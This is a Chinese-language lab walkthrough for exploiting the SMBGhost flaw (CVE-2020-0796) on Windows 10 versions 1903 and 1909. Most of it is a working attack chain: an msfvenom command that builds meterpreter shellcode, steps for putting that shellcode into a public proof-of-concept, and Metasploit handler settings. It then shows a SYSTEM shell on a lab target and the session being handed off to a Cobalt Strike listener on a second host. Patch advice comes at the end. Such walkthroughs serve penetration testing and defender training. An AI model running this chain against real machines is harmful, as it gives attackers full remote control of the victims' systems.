## 漏洞描述

该漏洞是存在于SMB
v3的远程代码执行漏洞，攻击者可以通过利用该漏洞，向存在漏洞的受害主机的SMB服务发送一个特殊构造的数据包即可远程执行任意代码，甚至是可以造成蠕虫攻击。攻击结果和永恒之蓝（MS17-010）相似，所以也被称为永恒之黑。

## 影响范围

    
    
    Windows 10 Version 1903 (32-bit Systems)
    Windows 10 Version 1903 for x64-based Systems
    Windows 10 Version 1903 for ARM64-based Systems
    Windows Server, Version 1903 (Server Core installation)
    Windows 10 Version 1909 (32-bit Systems)
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows Server, Version 1909 (Server Core installation)
    

## 漏洞扫描

使用工具检测漏洞

下载地址：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip

使用方法：`CVE-2020-0796-Scanner.exe 目标地址`

检测到漏洞存在

![image](https://image.3001.net/images/20210616/1623857399_60ca18f7b2370032c7210.png!small)

## 漏洞利用

 **1、 生成反向连接木马：**

运用msf中的木马生成模块

    
    
    msfvenom -p windows/x64/meterpreter/bind\_tcp LPORT=1234 -b '\x00' -i 1 -f python
    

![image.png](https://image.3001.net/images/20210616/1623857551_60ca198f8581c1f165d61.png!small)

注意这里选正向连接，这是因为，微软提到 “要利用该漏洞攻击客户端，未认证攻击者需要配置一个恶意 SMBv3
服务器并说服用户与之连接。”这表示我们需要先向目标发起请求

 **2、 替换shellcode，将上面生成的代码替换原文中的代码**

exp下载地址：`https://github.com/chompie1337/SMBGhost_RCE_PoC`

打开exploit.py

![image.png](https://image.3001.net/images/20210616/1623857576_60ca19a8f0b89e052226b.png!small)

记得将buf替换回USER_PAYLOAD

![image.png](https://image.3001.net/images/20210616/1623857590_60ca19b67ac5c8142ca9a.png!small)

 **3、启动Metasploit监听**

payload正向监听（与exp中的payload保持一致）,监听端口1234(与exp中的lport保持一致)

kali终端运行msf：`msfconsole`

    
    
    use exploit/multi/handler #开启监听
    set payload windows/x64/meterpreter/bind_tcp #设置payload,注意选正向
    set lport 1234 #设置本地端口
    set rhost 192.168.19.133 #设置目标地址（设置之前也可以调用nmap扫描一下测试网络连通性）
    

![image.png](https://image.3001.net/images/20210616/1623857676_60ca1a0c0a322e8d11222.png!small)

**4、运行poc，自动建立连接**

    
    
    python3 exploit.py -ip 192.168.19.133
    

（攻击不稳定，需要多攻击几次才能成功，亲测powershell中执行似乎成功概率更大）

![image.png](https://image.3001.net/images/20210616/1623857688_60ca1a183ff30ff613998.png!small)

 **5、成功之后，在msf中 run，getshell且为system权限**

![image.png](https://image.3001.net/images/20210616/1623857760_60ca1a60306012325ce41.png!small)

 **6、开启CS**

运行服务端，端口为50050

![image.png](https://image.3001.net/images/20210616/1623857774_60ca1a6e54113c04107ed.png!small)

新开窗口，运行客户端，密码是服务端设置的密码，用户名可以任意

![image](https://image.3001.net/images/20210616/1623859039_60ca1f5f0050d9d3d45eb.png!small)

 **7、回到msf，输入background，将我们得到的会话放在后台**

    
    
    use exploit/windows/local/payload_inject
    set payload windows/meterpreter/reverse_http
    set lport 1233 #cobaltstrike监听的端口
    set lhost 192.168.19.129 #cobaltstrike监听的ip
    set disablepayloadhandler true #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
    set session 1 #这里是获得的session的id
    

![image.png](https://image.3001.net/images/20210616/1623858018_60ca1b62196369f92f336.png!small)

**8、打开cs 开启监听，端口为1233，点击add添加监听**

![image](https://image.3001.net/images/20210616/1623859021_60ca1f4da07b5c9255638.png!small)

回到msf，输入run

![image.png](https://image.3001.net/images/20210616/1623858080_60ca1ba0e29801a8d05db.png!small)

成功得到会话，可以设置Sleep为1（默认得到命令结果回显的时间为60，比较久） 并且执行命令

![image](https://image.3001.net/images/20210616/1623858957_60ca1f0d79d03c9d74db0.png!small)

## 漏洞修复

更新windows，安装官方补丁

补丁地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796

## 总结

总的下来，永恒之黑利用过程比较顺利，但这个漏洞相对来说利用范围不大，并且也不是很稳定，攻击需要试多次才能成功，特别是很容易试得目标机器蓝屏，但如果攻击成功的话也能得到最高权限，因此实际情况中，不是最糟糕的情况不建议通过这个漏洞得到权限，风险比较大

